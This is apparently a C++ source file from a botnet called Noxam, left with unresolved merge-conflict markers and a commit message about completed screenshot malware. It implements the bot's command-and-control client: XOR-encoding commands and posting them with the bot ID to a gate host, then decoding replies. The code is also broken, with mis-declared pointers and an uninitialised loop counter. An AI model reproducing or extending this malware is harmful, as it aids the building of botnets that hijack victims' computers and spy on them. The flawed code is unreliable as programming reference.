#include <string>

<<<<<<< HEAD

=======
>>>>>>> 3931c6e (Completed Screenshot Malware For Noxam BotNet)
#include "../../Headers/Utils/NoxamGateHelper.hxx"
#include "../../Headers/Utils/NoxamGate.hxx"
#include "../../Headers/Crypto/NoxamWebSafeEncryption.hxx"
#include "../../Headers/Net/NoxamHTTP.hxx"

using namespace std;

/*
|===========================================================
|    NoxamGetBotID()
|===========================================================
|
|
|===========================================================
*/
<<<<<<< HEAD
char* NoxamGetBotID()
=======
char *NoxamGetBotID()
>>>>>>> 3931c6e (Completed Screenshot Malware For Noxam BotNet)
{
    return NoxamBotID;
}

<<<<<<< HEAD

=======
>>>>>>> 3931c6e (Completed Screenshot Malware For Noxam BotNet)
/*
|===========================================================
|    NoxamSendCommandWithDecodeResponse()
|===========================================================
|
|
|===========================================================
*/
<<<<<<< HEAD
char* NoxamSendCommandWithDecodeResponse(char* NxmCommand)
{
    char* NxmKey = NoxamXorGenerateKey(32), NxmEncodedKey, NxmEncodedResult, NxmReturnedData, NxmNewKey;
=======
char *NoxamSendCommandWithDecodeResponse(char *NxmCommand)
{
    char *NxmKey = NoxamXorGenerateKey(32), NxmEncodedKey, NxmEncodedResult, NxmReturnedData, NxmNewKey;
>>>>>>> 3931c6e (Completed Screenshot Malware For Noxam BotNet)
    int NxmDataLengthl, NxmOutputLength, NxmI;

    NxmEncodedResult = NoxamGetEncodedXorResult(NxmCommand, NxmKey, strlen(NxmCommand), 32, &NxmEncodedKey);
    NoxamXorFreeKey(NxmKey);
<<<<<<< HEAD
    NxmNameValuePair* NxmHeadersRkkHash[] = {
            new NxmNameValuePair("X-Token", NxmEncodedKey),
            new NxmNameValuePair("X-ID", NoxamBotID),
            0,
    };
    NxmNameValuePair* NxmPostDataRkkHash[] = {
            new NxmNameValuePair("X", NxmEncodedResult),
            0,
    };
    NxmNameValuePair* NxmReturnHeader;
    int NxmResult = NoxamHttQuery((char*)NOXAM_GATE_HOST, (char*)NOXAM_GATE_PATH, NxmHeadersRkkHash, &NxmReturnHeader, &NxmReturnedData, &NxmDataLengthl, true, "POST", NxmPostDataRkkHash);
    NoxamFreeEncodedXorResult(NxmEncodedResult, NxmEncodedKey);
    NxmNameValuePair** NxmHeaderPointer = NxmReturnHeader;
=======
    NxmNameValuePair *NxmHeadersRkkHash[] = {
        new NxmNameValuePair("X-Token", NxmEncodedKey),
        new NxmNameValuePair("X-ID", NoxamBotID),
        0,
    };
    NxmNameValuePair *NxmPostDataRkkHash[] = {
        new NxmNameValuePair("X", NxmEncodedResult),
        0,
    };
    NxmNameValuePair *NxmReturnHeader;
    int NxmResult = NoxamHttQuery((char *)NOXAM_GATE_HOST, (char *)NOXAM_GATE_PATH, NxmHeadersRkkHash, &NxmReturnHeader, &NxmReturnedData, &NxmDataLengthl, true, "POST", NxmPostDataRkkHash);
    NoxamFreeEncodedXorResult(NxmEncodedResult, NxmEncodedKey);
    NxmNameValuePair **NxmHeaderPointer = NxmReturnHeader;
>>>>>>> 3931c6e (Completed Screenshot Malware For Noxam BotNet)

    while (NxmHeaderPointer != 0 && *NxmHeaderPointer != 0)
    {
        if (strcmp((*NxmHeaderPointer)->NxmName, "X-Token") == 0)
        {
<<<<<<< HEAD
            NxmNewKey = (char*)(*NxmHeaderPointer)->NxmValue;
=======
            NxmNewKey = (char *)(*NxmHeaderPointer)->NxmValue;
>>>>>>> 3931c6e (Completed Screenshot Malware For Noxam BotNet)
            break;
        }
        NxmHeaderPointer++;
    }
<<<<<<< HEAD
    char* NxmOutput = NoxamGetDecodedXorResult(NxmReturnedData, NxmNewKey, &NxmOutputLength);
    char* NxmReturnBuffer = (char*)malloc(NxmOutputLength + 1);
=======
    char *NxmOutput = NoxamGetDecodedXorResult(NxmReturnedData, NxmNewKey, &NxmOutputLength);
    char *NxmReturnBuffer = (char *)malloc(NxmOutputLength + 1);
>>>>>>> 3931c6e (Completed Screenshot Malware For Noxam BotNet)
    NxmReturnBuffer[NxmOutputLength] = 0;
    memcpy_s(NxmReturnBuffer, NxmOutputLength, NxmOutput, NxmOutputLength);
    NoxamFreeDecodedXorResult(NxmOutput);

    while (NxmHeadersRkkHash[NxmI] != 0)
    {
        delete (NxmHeadersRkkHash[NxmI]);
        NxmI++;
    }
    NoxamFreeHTTPResponse(NxmReturnHeader, NxmReturnedData);

    return NxmReturnBuffer;
<<<<<<< HEAD

}


=======
}

>>>>>>> 3931c6e (Completed Screenshot Malware For Noxam BotNet)
/*
|===========================================================
|    NoxamSetBoldID()
|===========================================================
|
|
|===========================================================
*/
<<<<<<< HEAD
void NoxamSetBoldID(char* NxmNewID)
{
    NoxamBotID = (char*)malloc(strlen(NxmNewID) + 1);
=======
void NoxamSetBoldID(char *NxmNewID)
{
    NoxamBotID = (char *)malloc(strlen(NxmNewID) + 1);
>>>>>>> 3931c6e (Completed Screenshot Malware For Noxam BotNet)
    NoxamBotID[strlen(NxmNewID)] = 0;
    memcpy_s(NoxamBotID, strlen(NxmNewID), NxmNewID, strlen(NxmNewID));
}

/*
|===========================================================
|    NoxamFreeDecodeResponse()
|===========================================================
|
|
|===========================================================
*/
<<<<<<< HEAD
void NoxamFreeDecodeResponse(char* NxmResponse)
=======
void NoxamFreeDecodeResponse(char *NxmResponse)
>>>>>>> 3931c6e (Completed Screenshot Malware For Noxam BotNet)
{
    free(NxmResponse);
}